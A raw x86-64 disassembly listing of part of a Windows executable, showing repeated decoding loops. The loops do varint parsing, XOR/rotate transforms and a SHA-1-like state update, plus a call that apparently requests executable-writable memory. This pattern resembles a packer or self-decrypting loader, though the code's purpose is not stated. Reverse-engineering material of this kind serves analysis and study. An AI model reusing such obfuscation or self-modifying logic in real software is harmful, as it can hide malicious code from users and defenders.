   14004b143:	lea    rax,[r15+0x10]
   14004b147:	mov    QWORD PTR [rbp+0xd10],rax
   14004b14e:	mov    ecx,0xc8
   14004b153:	lea    rdi,[rbp+0xd18]
   14004b15a:	mov    rsi,rbx
   14004b15d:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14004b15f:	mov    r12,QWORD PTR [rbp+0xd50]
   14004b166:	sub    r12,0x82
   14004b16d:	mov    eax,0x0
   14004b172:	cmovb  r12,rax
   14004b176:	cmp    r12,0x1
   14004b17a:	mov    QWORD PTR [rbp+0xf68],r12
   14004b181:	adc    r12,0x0
   14004b185:	mov    QWORD PTR [rbp+0xca8],r12
   14004b18c:	shr    r12,0x4
   14004b190:	cmp    r12,0x1
   14004b194:	adc    r12,0x0
   14004b198:	lea    rcx,[rbp+0x500]
   14004b19f:	push   0x40
   14004b1a1:	pop    rdx
   14004b1a2:	call   0x14003c111
   14004b1a7:	xor    ebx,ebx
   14004b1a9:	cmp    rbx,0x40
   14004b1ad:	je     0x14004b7bd
   14004b1b3:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004b1ba:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004b1c1:	lea    rax,[r8+0x8]
   14004b1c5:	cmp    rax,r9
   14004b1c8:	jbe    0x14004b1d1
   14004b1ca:	xor    edx,edx
   14004b1cc:	jmp    0x14004b7a9
   14004b1d1:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004b1d8:	cmp    rax,0x8
   14004b1dc:	jae    0x14004b735
   14004b1e2:	mov    rcx,QWORD PTR [rbp+0xd60]
   14004b1e9:	cmp    rcx,QWORD PTR [rbp+0xd68]
   14004b1f0:	jae    0x14004b236
   14004b1f2:	mov    rcx,QWORD PTR [rbp+0xd18]
   14004b1f9:	mov    rdx,QWORD PTR [rbp+0xd58]
   14004b200:	cmp    rdx,rcx
   14004b203:	jae    0x14004b236
   14004b205:	lea    rax,[r15+0x10]
   14004b209:	movzx  r13d,BYTE PTR [rax+rdx*1]
   14004b20e:	and    r13d,0x7f
   14004b212:	lea    rax,[rdx+0x1]
   14004b216:	cmp    rax,rcx
   14004b219:	jae    0x14004b244
   14004b21b:	movzx  r8d,BYTE PTR [r15+rdx*1+0x11]
   14004b221:	test   r8b,r8b
   14004b224:	jns    0x14004b23e
   14004b226:	shl    r13,0x7
   14004b22a:	and    r8d,0x7f
   14004b22e:	or     r13,r8
   14004b231:	mov    rdx,rax
   14004b234:	jmp    0x14004b212
   14004b236:	xor    r11d,r11d
   14004b239:	jmp    0x14004b6b1
   14004b23e:	inc    rdx
   14004b241:	mov    rcx,rdx
   14004b244:	mov    QWORD PTR [rbp+0xd58],rcx
   14004b24b:	mov    rax,r13
   14004b24e:	shr    rax,0x8
   14004b252:	mov    rsi,r13
   14004b255:	shr    rsi,0x28
   14004b259:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14004b260:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004b267:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004b26e:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004b275:	mov    DWORD PTR [rbp+0x7d0],eax
   14004b27b:	lea    rax,[rip+0x3cdd6]        # 0x140088058
   14004b282:	mov    QWORD PTR [rsp+0x20],rax
   14004b287:	lea    rcx,[rbp+0xf80]
   14004b28e:	push   0x4
   14004b290:	pop    rdx
   14004b291:	lea    r8,[rbp+0x7d0]
   14004b298:	mov    r9,rdx
   14004b29b:	call   0x1400638fe
   14004b2a0:	mov    BYTE PTR [rbp+0xf84],sil
   14004b2a7:	mov    rsi,QWORD PTR [rbp+0xd30]
   14004b2ae:	cmp    QWORD PTR [rbp+0xd78],rsi
   14004b2b5:	jbe    0x14004b3e5
   14004b2bb:	mov    r9,QWORD PTR [rbp+0xd38]
   14004b2c2:	cmp    r9,0x4
   14004b2c6:	ja     0x140059d9c
   14004b2cc:	mov    rcx,QWORD PTR [rbp+0xd40]
   14004b2d3:	cmp    rcx,0x5
   14004b2d7:	jae    0x140059dae
   14004b2dd:	mov    r8,QWORD PTR [rbp+0xd78]
   14004b2e4:	cmp    r8,rsi
   14004b2e7:	je     0x140059dbc
   14004b2ed:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   14004b2f4:	mov    cl,BYTE PTR [rbp+0xd48]
   14004b2fa:	rol    eax,cl
   14004b2fc:	sub    r8,rsi
   14004b2ff:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   14004b307:	xor    edx,edx
   14004b309:	div    r8
   14004b30c:	mov    rdi,rdx
   14004b30f:	mov    rax,QWORD PTR [rbp+0xd80]
   14004b316:	mov    QWORD PTR [rbp+0x1060],rax
   14004b31d:	cmp    rsi,0x40
   14004b321:	push   0x40
   14004b323:	pop    rax
   14004b324:	cmovae rsi,rax
   14004b328:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14004b32f:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004b336:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004b33d:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004b344:	lea    rcx,[rbp+0x7d0]
   14004b34b:	mov    rdx,rsi
   14004b34e:	call   0x14003c0b8
   14004b353:	mov    r10,QWORD PTR [rbp+0xd78]
   14004b35a:	test   r10,r10
   14004b35d:	je     0x14004b3ab
   14004b35f:	mov    rcx,rax
   14004b362:	mov    r8,rdx
   14004b365:	mov    rax,rdx
   14004b368:	add    rax,rdi
   14004b36b:	mov    r9,QWORD PTR [rbp+0xd70]
   14004b372:	cmp    rax,r10
   14004b375:	jbe    0x14004b395
   14004b377:	xor    r11d,r11d
   14004b37a:	cmp    r8,r11
   14004b37d:	je     0x14004b3ab
   14004b37f:	lea    rax,[r11+rdi*1]
   14004b383:	xor    edx,edx
   14004b385:	div    r10
   14004b388:	mov    al,BYTE PTR [r9+rdx*1]
   14004b38c:	mov    BYTE PTR [rcx+r11*1],al
   14004b390:	inc    r11
   14004b393:	jmp    0x14004b37a
   14004b395:	add    r9,rdi
   14004b398:	xor    eax,eax
   14004b39a:	cmp    r8,rax
   14004b39d:	je     0x14004b3ab
   14004b39f:	mov    dl,BYTE PTR [r9+rax*1]
   14004b3a3:	mov    BYTE PTR [rcx+rax*1],dl
   14004b3a6:	inc    rax
   14004b3a9:	jmp    0x14004b39a
   14004b3ab:	mov    rcx,QWORD PTR [rbp+0xd28]
   14004b3b2:	xor    eax,eax
   14004b3b4:	cmp    rsi,rax
   14004b3b7:	je     0x14004b3e5
   14004b3b9:	cmp    rcx,0x3f
   14004b3bd:	ja     0x140059d8e
   14004b3c3:	mov    edx,eax
   14004b3c5:	and    edx,0x7
   14004b3c8:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   14004b3cf:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   14004b3d6:	inc    rax
   14004b3d9:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   14004b3e0:	inc    rcx
   14004b3e3:	jmp    0x14004b3b4
   14004b3e5:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14004b3ec:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14004b3f3:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004b3fa:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004b401:	xor    eax,eax
   14004b403:	cmp    rax,0x40
   14004b407:	je     0x14004b41f
   14004b409:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   14004b410:	bswap  ecx
   14004b412:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14004b419:	add    rax,0x4
   14004b41d:	jmp    0x14004b403
   14004b41f:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   14004b426:	mov    eax,DWORD PTR [rbp+0xd98]
   14004b42c:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   14004b433:	mov    DWORD PTR [rbp+0x7e0],eax
   14004b439:	and    DWORD PTR [rbp+0x7e4],0x0
   14004b440:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   14004b447:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   14004b44e:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   14004b455:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   14004b45c:	lea    rax,[rbp+0x7e8]
   14004b463:	movups XMMWORD PTR [rax+0x30],xmm3
   14004b467:	movups XMMWORD PTR [rax+0x20],xmm2
   14004b46b:	movups XMMWORD PTR [rax+0x10],xmm1
   14004b46f:	movups XMMWORD PTR [rax],xmm0
   14004b472:	call   0x140064214
   14004b477:	mov    al,BYTE PTR [rip+0x4d610]        # 0x140098a8d
   14004b47d:	cmp    al,0x1
   14004b47f:	je     0x14004b4c8
   14004b481:	movzx  eax,al
   14004b484:	cmp    eax,0x2
   14004b487:	je     0x14004b56e
   14004b48d:	and    DWORD PTR [rbp+0x400],0x0
   14004b494:	lea    rcx,[rip+0xfffffffffffb5be5]        # 0x140001080
   14004b49b:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004b4a2:	push   0x40
   14004b4a4:	pop    r8
   14004b4a6:	lea    r9,[rbp+0x400]
   14004b4ad:	call   QWORD PTR [rip+0x49355]        # 0x140094808
   14004b4b3:	test   eax,eax
   14004b4b5:	sete   cl
   14004b4b8:	inc    cl
   14004b4ba:	mov    BYTE PTR [rip+0x4d5cd],cl        # 0x140098a8d
   14004b4c0:	test   eax,eax
   14004b4c2:	je     0x14004b56e
   14004b4c8:	mov    al,BYTE PTR [rip+0x4d6ea]        # 0x140098bb8
   14004b4ce:	cmp    al,0x1
   14004b4d0:	je     0x14004b4f5
   14004b4d2:	movzx  eax,al
   14004b4d5:	test   eax,eax
   14004b4d7:	jne    0x14004b56e
   14004b4dd:	call   0x140065d51
   14004b4e2:	test   rax,rax
   14004b4e5:	sete   cl
   14004b4e8:	inc    cl
   14004b4ea:	mov    BYTE PTR [rip+0x4d6c8],cl        # 0x140098bb8
   14004b4f0:	test   rax,rax
   14004b4f3:	je     0x14004b56e
   14004b4f5:	call   0x140064227
   14004b4fa:	mov    eax,0xc8c291de
   14004b4ff:	xchg   DWORD PTR [rip+0x4d5db],eax        # 0x140098ae0
   14004b505:	call   QWORD PTR [rip+0x49145]        # 0x140094650
   14004b50b:	mov    eax,eax
   14004b50d:	mov    QWORD PTR [rip+0x4caec],rax        # 0x140098000
   14004b514:	lea    rcx,[rbp+0x7d0]
   14004b51b:	push   0xffffffffffffffff
   14004b51d:	pop    rdx
   14004b51e:	call   0x14002b840
   14004b523:	xor    eax,eax
   14004b525:	xchg   DWORD PTR [rip+0x4d5b5],eax        # 0x140098ae0
   14004b52b:	mov    BYTE PTR [rip+0x4d55c],0x0        # 0x140098a8e
   14004b532:	mov    eax,DWORD PTR [rbp+0x7d0]
   14004b538:	add    DWORD PTR [rbp+0xd88],eax
   14004b53e:	mov    eax,DWORD PTR [rbp+0x7d4]
   14004b544:	add    DWORD PTR [rbp+0xd8c],eax
   14004b54a:	mov    eax,DWORD PTR [rbp+0x7d8]
   14004b550:	add    DWORD PTR [rbp+0xd90],eax
   14004b556:	mov    eax,DWORD PTR [rbp+0x7dc]
   14004b55c:	add    DWORD PTR [rbp+0xd94],eax
   14004b562:	mov    eax,DWORD PTR [rbp+0x7e0]
   14004b568:	add    DWORD PTR [rbp+0xd98],eax
   14004b56e:	mov    BYTE PTR [rip+0x4d517],0x0        # 0x140098a8c
   14004b575:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004b57c:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004b583:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004b58a:	xor    eax,eax
   14004b58c:	cmp    rax,0x14
   14004b590:	je     0x14004b5a8
   14004b592:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   14004b599:	bswap  ecx
   14004b59b:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   14004b5a2:	add    rax,0x4
   14004b5a6:	jmp    0x14004b58c
   14004b5a8:	mov    r8,QWORD PTR [rbp+0xd20]
   14004b5af:	mov    eax,r13d
   14004b5b2:	shr    eax,0x3
   14004b5b5:	and    eax,0x1f
   14004b5b8:	lea    rcx,[rax+rbp*1]
   14004b5bc:	add    rcx,0x7d0
   14004b5c3:	xor    r9d,r9d
   14004b5c6:	xor    edx,edx
   14004b5c8:	xor    eax,eax
   14004b5ca:	cmp    r9,0x10
   14004b5ce:	je     0x14004b5e9
   14004b5d0:	shld   rax,rdx,0x8
   14004b5d5:	mov    r10,rdx
   14004b5d8:	shl    r10,0x8
   14004b5dc:	movzx  edx,BYTE PTR [rcx+r9*1]
   14004b5e1:	inc    r9
   14004b5e4:	or     rdx,r10
   14004b5e7:	jmp    0x14004b5ca
   14004b5e9:	push   0xffffffffffffffff
   14004b5eb:	pop    r9
   14004b5ed:	mov    r10,r9
   14004b5f0:	mov    ecx,r8d
   14004b5f3:	shl    r10,cl
   14004b5f6:	cmp    r8,0x40
   14004b5fa:	not    r10
   14004b5fd:	cmovae r10,r9
   14004b601:	and    r13d,0x7
   14004b605:	lea    ecx,[r8+r13*1]
   14004b609:	neg    cl
   14004b60b:	shrd   rdx,rax,cl
   14004b60f:	shr    rax,cl
   14004b612:	test   cl,0x40
   14004b615:	cmove  rax,rdx
   14004b619:	and    rax,r10
   14004b61c:	mov    rsi,QWORD PTR [rbp+0xd60]
   14004b623:	add    r8,0x7
   14004b627:	bswap  rax
   14004b62a:	shr    r8,0x3
   14004b62e:	mov    QWORD PTR [rbp+0x1060],rax
   14004b635:	mov    r9,rsi
   14004b638:	imul   r9,r8
   14004b63c:	push   0x8
   14004b63e:	pop    rcx
   14004b63f:	sub    rcx,r8
   14004b642:	dec    r8
   14004b645:	mov    rax,QWORD PTR [rbp+0x1168]
   14004b64c:	lea    r11,[rax+r9*1]
   14004b650:	mov    rax,r9
   14004b653:	xor    edx,edx
   14004b655:	push   0x14
   14004b657:	pop    rdi
   14004b658:	div    rdi
   14004b65b:	cmp    rcx,0x8
   14004b65f:	je     0x14004b685
   14004b661:	cmp    r8,0x7
   14004b665:	ja     0x140059d80
   14004b66b:	imul   rax,rax,0xffffffffffffffec
   14004b66f:	mov    al,BYTE PTR [r11+rax*1]
   14004b673:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   14004b67a:	inc    rcx
   14004b67d:	inc    r11
   14004b680:	inc    r9
   14004b683:	jmp    0x14004b650
   14004b685:	mov    r11,QWORD PTR [rbp+0x1060]
   14004b68c:	bswap  r11
   14004b68f:	and    r11,r10
   14004b692:	inc    rsi
   14004b695:	mov    QWORD PTR [rbp+0xd60],rsi
   14004b69c:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004b6a3:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004b6aa:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004b6b1:	mov    rdx,r9
   14004b6b4:	sub    rdx,r8
   14004b6b7:	sub    rdx,rax
   14004b6ba:	mov    rcx,QWORD PTR [rbp+0xd20]
   14004b6c1:	cmp    rdx,rcx
   14004b6c4:	cmovae rdx,rcx
   14004b6c8:	cmp    rdx,0x1
   14004b6cc:	adc    rdx,0x0
   14004b6d0:	mov    r10d,ecx
   14004b6d3:	sub    r10d,edx
   14004b6d6:	and    r10b,0x3f
   14004b6da:	cmp    rcx,rdx
   14004b6dd:	movzx  ecx,r10b
   14004b6e1:	mov    r10d,0x0
   14004b6e7:	cmovbe ecx,r10d
   14004b6eb:	shr    r11,cl
   14004b6ee:	mov    r10,QWORD PTR [rbp+0xdb0]
   14004b6f5:	mov    rsi,QWORD PTR [rbp+0xdb8]
   14004b6fc:	mov    ecx,edx
   14004b6fe:	shld   rsi,r10,cl
   14004b702:	shl    r10,cl
   14004b705:	test   dl,0x40
   14004b708:	cmovne rsi,r10
   14004b70c:	mov    ecx,0x0
   14004b711:	cmove  rcx,r10
   14004b715:	or     rcx,r11
   14004b718:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004b71f:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004b726:	add    rax,rdx
   14004b729:	mov    QWORD PTR [rbp+0xdc0],rax
   14004b730:	jmp    0x14004b1d8
   14004b735:	add    rax,0xfffffffffffffff8
   14004b739:	mov    QWORD PTR [rbp+0xdc0],rax
   14004b740:	mov    r9,QWORD PTR [rbp+0xdb8]
   14004b747:	mov    r10,r9
   14004b74a:	mov    ecx,eax
   14004b74c:	shr    r10,cl
   14004b74f:	mov    r11,QWORD PTR [rbp+0xdb0]
   14004b756:	mov    rdx,r11
   14004b759:	shrd   rdx,r9,cl
   14004b75d:	push   0xffffffffffffffff
   14004b75f:	pop    rdi
   14004b760:	mov    rsi,rdi
   14004b763:	shl    rsi,cl
   14004b766:	test   al,0x40
   14004b768:	cmovne rdx,r10
   14004b76c:	mov    ecx,0x0
   14004b771:	cmove  rcx,rsi
   14004b775:	cmove  rsi,rdi
   14004b779:	not    rsi
   14004b77c:	not    rcx
   14004b77f:	and    rcx,r11
   14004b782:	and    rsi,r9
   14004b785:	test   rax,rax
   14004b788:	cmove  rsi,rax
   14004b78c:	cmove  rcx,rax
   14004b790:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004b797:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004b79e:	add    r8,0x8
   14004b7a2:	mov    QWORD PTR [rbp+0xdc8],r8
   14004b7a9:	inc    rbx
   14004b7ac:	lea    rcx,[rbp+0x500]
   14004b7b3:	call   0x14003c141
   14004b7b8:	jmp    0x14004b1a9
   14004b7bd:	mov    rax,QWORD PTR [rbp+0x500]
   14004b7c4:	mov    QWORD PTR [rbp+0x1138],rax
   14004b7cb:	mov    rax,QWORD PTR [rbp+0x508]
   14004b7d2:	mov    QWORD PTR [rbp+0x1148],rax
   14004b7d9:	mov    rax,QWORD PTR [rbp+0x510]
   14004b7e0:	mov    QWORD PTR [rbp+0x1180],rax
   14004b7e7:	lea    rcx,[rbp+0x500]
   14004b7ee:	push   0x3a
   14004b7f0:	pop    rdx
   14004b7f1:	call   0x14003c111
   14004b7f6:	xor    ebx,ebx
   14004b7f8:	cmp    rbx,0x3a
   14004b7fc:	je     0x14004be0c
   14004b802:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004b809:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004b810:	lea    rax,[r8+0x8]
   14004b814:	cmp    rax,r9
   14004b817:	jbe    0x14004b820
   14004b819:	xor    edx,edx
   14004b81b:	jmp    0x14004bdf8
   14004b820:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004b827:	cmp    rax,0x8
   14004b82b:	jae    0x14004bd84
   14004b831:	mov    rcx,QWORD PTR [rbp+0xd60]
   14004b838:	cmp    rcx,QWORD PTR [rbp+0xd68]
   14004b83f:	jae    0x14004b885
   14004b841:	mov    rcx,QWORD PTR [rbp+0xd18]
   14004b848:	mov    rdx,QWORD PTR [rbp+0xd58]
   14004b84f:	cmp    rdx,rcx
   14004b852:	jae    0x14004b885
   14004b854:	lea    rax,[r15+0x10]
   14004b858:	movzx  r13d,BYTE PTR [rax+rdx*1]
   14004b85d:	and    r13d,0x7f
   14004b861:	lea    rax,[rdx+0x1]
   14004b865:	cmp    rax,rcx
   14004b868:	jae    0x14004b893
   14004b86a:	movzx  r8d,BYTE PTR [r15+rdx*1+0x11]
   14004b870:	test   r8b,r8b
   14004b873:	jns    0x14004b88d
   14004b875:	shl    r13,0x7
   14004b879:	and    r8d,0x7f
   14004b87d:	or     r13,r8
   14004b880:	mov    rdx,rax
   14004b883:	jmp    0x14004b861
   14004b885:	xor    r11d,r11d
   14004b888:	jmp    0x14004bd00
   14004b88d:	inc    rdx
   14004b890:	mov    rcx,rdx
   14004b893:	mov    QWORD PTR [rbp+0xd58],rcx
   14004b89a:	mov    rax,r13
   14004b89d:	shr    rax,0x8
   14004b8a1:	mov    rsi,r13
   14004b8a4:	shr    rsi,0x28
   14004b8a8:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14004b8af:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004b8b6:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004b8bd:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004b8c4:	mov    DWORD PTR [rbp+0x7d0],eax
   14004b8ca:	lea    rax,[rip+0x3c787]        # 0x140088058
   14004b8d1:	mov    QWORD PTR [rsp+0x20],rax
   14004b8d6:	lea    rcx,[rbp+0xf80]
   14004b8dd:	push   0x4
   14004b8df:	pop    rdx
   14004b8e0:	lea    r8,[rbp+0x7d0]
   14004b8e7:	mov    r9,rdx
   14004b8ea:	call   0x1400638fe
   14004b8ef:	mov    BYTE PTR [rbp+0xf84],sil
   14004b8f6:	mov    rsi,QWORD PTR [rbp+0xd30]
   14004b8fd:	cmp    QWORD PTR [rbp+0xd78],rsi
   14004b904:	jbe    0x14004ba34
   14004b90a:	mov    r9,QWORD PTR [rbp+0xd38]
   14004b911:	cmp    r9,0x4
   14004b915:	ja     0x140059d9c
   14004b91b:	mov    rcx,QWORD PTR [rbp+0xd40]
   14004b922:	cmp    rcx,0x5
   14004b926:	jae    0x140059dae
   14004b92c:	mov    r8,QWORD PTR [rbp+0xd78]
   14004b933:	cmp    r8,rsi
   14004b936:	je     0x140059dbc
   14004b93c:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   14004b943:	mov    cl,BYTE PTR [rbp+0xd48]
   14004b949:	rol    eax,cl
   14004b94b:	sub    r8,rsi
   14004b94e:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   14004b956:	xor    edx,edx
   14004b958:	div    r8
   14004b95b:	mov    rdi,rdx
   14004b95e:	mov    rax,QWORD PTR [rbp+0xd80]
   14004b965:	mov    QWORD PTR [rbp+0x1060],rax
   14004b96c:	cmp    rsi,0x40
   14004b970:	push   0x40
   14004b972:	pop    rax
   14004b973:	cmovae rsi,rax
   14004b977:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14004b97e:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004b985:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004b98c:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004b993:	lea    rcx,[rbp+0x7d0]
   14004b99a:	mov    rdx,rsi
   14004b99d:	call   0x14003c0b8
   14004b9a2:	mov    r10,QWORD PTR [rbp+0xd78]
   14004b9a9:	test   r10,r10
   14004b9ac:	je     0x14004b9fa
   14004b9ae:	mov    rcx,rax
   14004b9b1:	mov    r8,rdx
   14004b9b4:	mov    rax,rdx
   14004b9b7:	add    rax,rdi
   14004b9ba:	mov    r9,QWORD PTR [rbp+0xd70]
   14004b9c1:	cmp    rax,r10
   14004b9c4:	jbe    0x14004b9e4
   14004b9c6:	xor    r11d,r11d
   14004b9c9:	cmp    r8,r11
   14004b9cc:	je     0x14004b9fa
   14004b9ce:	lea    rax,[r11+rdi*1]
   14004b9d2:	xor    edx,edx
   14004b9d4:	div    r10
   14004b9d7:	mov    al,BYTE PTR [r9+rdx*1]
   14004b9db:	mov    BYTE PTR [rcx+r11*1],al
   14004b9df:	inc    r11
   14004b9e2:	jmp    0x14004b9c9
   14004b9e4:	add    r9,rdi
   14004b9e7:	xor    eax,eax
   14004b9e9:	cmp    r8,rax
   14004b9ec:	je     0x14004b9fa
   14004b9ee:	mov    dl,BYTE PTR [r9+rax*1]
   14004b9f2:	mov    BYTE PTR [rcx+rax*1],dl
   14004b9f5:	inc    rax
   14004b9f8:	jmp    0x14004b9e9
   14004b9fa:	mov    rcx,QWORD PTR [rbp+0xd28]
   14004ba01:	xor    eax,eax
   14004ba03:	cmp    rsi,rax
   14004ba06:	je     0x14004ba34
   14004ba08:	cmp    rcx,0x3f
   14004ba0c:	ja     0x140059d8e
   14004ba12:	mov    edx,eax
   14004ba14:	and    edx,0x7
   14004ba17:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   14004ba1e:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   14004ba25:	inc    rax
   14004ba28:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   14004ba2f:	inc    rcx
   14004ba32:	jmp    0x14004ba03
   14004ba34:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14004ba3b:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14004ba42:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004ba49:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004ba50:	xor    eax,eax
   14004ba52:	cmp    rax,0x40
   14004ba56:	je     0x14004ba6e
   14004ba58:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   14004ba5f:	bswap  ecx
   14004ba61:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14004ba68:	add    rax,0x4
   14004ba6c:	jmp    0x14004ba52
   14004ba6e:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   14004ba75:	mov    eax,DWORD PTR [rbp+0xd98]
   14004ba7b:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   14004ba82:	mov    DWORD PTR [rbp+0x7e0],eax
   14004ba88:	and    DWORD PTR [rbp+0x7e4],0x0
   14004ba8f:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   14004ba96:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   14004ba9d:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   14004baa4:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   14004baab:	lea    rax,[rbp+0x7e8]
   14004bab2:	movups XMMWORD PTR [rax+0x30],xmm3
   14004bab6:	movups XMMWORD PTR [rax+0x20],xmm2
   14004baba:	movups XMMWORD PTR [rax+0x10],xmm1
   14004babe:	movups XMMWORD PTR [rax],xmm0
   14004bac1:	call   0x140064214
   14004bac6:	mov    al,BYTE PTR [rip+0x4cfc1]        # 0x140098a8d
   14004bacc:	cmp    al,0x1
   14004bace:	je     0x14004bb17
   14004bad0:	movzx  eax,al
   14004bad3:	cmp    eax,0x2
   14004bad6:	je     0x14004bbbd
   14004badc:	and    DWORD PTR [rbp+0x400],0x0
   14004bae3:	lea    rcx,[rip+0xfffffffffffb5596]        # 0x140001080
   14004baea:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004baf1:	push   0x40
   14004baf3:	pop    r8
   14004baf5:	lea    r9,[rbp+0x400]
   14004bafc:	call   QWORD PTR [rip+0x48d06]        # 0x140094808
   14004bb02:	test   eax,eax
   14004bb04:	sete   cl
   14004bb07:	inc    cl
   14004bb09:	mov    BYTE PTR [rip+0x4cf7e],cl        # 0x140098a8d
   14004bb0f:	test   eax,eax
   14004bb11:	je     0x14004bbbd
   14004bb17:	mov    al,BYTE PTR [rip+0x4d09b]        # 0x140098bb8
   14004bb1d:	cmp    al,0x1
   14004bb1f:	je     0x14004bb44
   14004bb21:	movzx  eax,al
   14004bb24:	test   eax,eax
   14004bb26:	jne    0x14004bbbd
   14004bb2c:	call   0x140065d51
   14004bb31:	test   rax,rax
   14004bb34:	sete   cl
   14004bb37:	inc    cl
   14004bb39:	mov    BYTE PTR [rip+0x4d079],cl        # 0x140098bb8
   14004bb3f:	test   rax,rax
   14004bb42:	je     0x14004bbbd
   14004bb44:	call   0x140064227
   14004bb49:	mov    eax,0xc8c291de
   14004bb4e:	xchg   DWORD PTR [rip+0x4cf8c],eax        # 0x140098ae0
   14004bb54:	call   QWORD PTR [rip+0x48af6]        # 0x140094650
   14004bb5a:	mov    eax,eax
   14004bb5c:	mov    QWORD PTR [rip+0x4c49d],rax        # 0x140098000
   14004bb63:	lea    rcx,[rbp+0x7d0]
   14004bb6a:	push   0xffffffffffffffff
   14004bb6c:	pop    rdx
   14004bb6d:	call   0x14002b840
   14004bb72:	xor    eax,eax
   14004bb74:	xchg   DWORD PTR [rip+0x4cf66],eax        # 0x140098ae0
   14004bb7a:	mov    BYTE PTR [rip+0x4cf0d],0x0        # 0x140098a8e
   14004bb81:	mov    eax,DWORD PTR [rbp+0x7d0]
   14004bb87:	add    DWORD PTR [rbp+0xd88],eax
   14004bb8d:	mov    eax,DWORD PTR [rbp+0x7d4]
   14004bb93:	add    DWORD PTR [rbp+0xd8c],eax
   14004bb99:	mov    eax,DWORD PTR [rbp+0x7d8]
   14004bb9f:	add    DWORD PTR [rbp+0xd90],eax
   14004bba5:	mov    eax,DWORD PTR [rbp+0x7dc]
   14004bbab:	add    DWORD PTR [rbp+0xd94],eax
   14004bbb1:	mov    eax,DWORD PTR [rbp+0x7e0]
   14004bbb7:	add    DWORD PTR [rbp+0xd98],eax
   14004bbbd:	mov    BYTE PTR [rip+0x4cec8],0x0        # 0x140098a8c
   14004bbc4:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004bbcb:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004bbd2:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004bbd9:	xor    eax,eax
   14004bbdb:	cmp    rax,0x14
   14004bbdf:	je     0x14004bbf7
   14004bbe1:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   14004bbe8:	bswap  ecx
   14004bbea:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   14004bbf1:	add    rax,0x4
   14004bbf5:	jmp    0x14004bbdb
   14004bbf7:	mov    r8,QWORD PTR [rbp+0xd20]
   14004bbfe:	mov    eax,r13d
   14004bc01:	shr    eax,0x3
   14004bc04:	and    eax,0x1f
   14004bc07:	lea    rcx,[rax+rbp*1]
   14004bc0b:	add    rcx,0x7d0
   14004bc12:	xor    r9d,r9d
   14004bc15:	xor    edx,edx
   14004bc17:	xor    eax,eax
   14004bc19:	cmp    r9,0x10
   14004bc1d:	je     0x14004bc38
   14004bc1f:	shld   rax,rdx,0x8
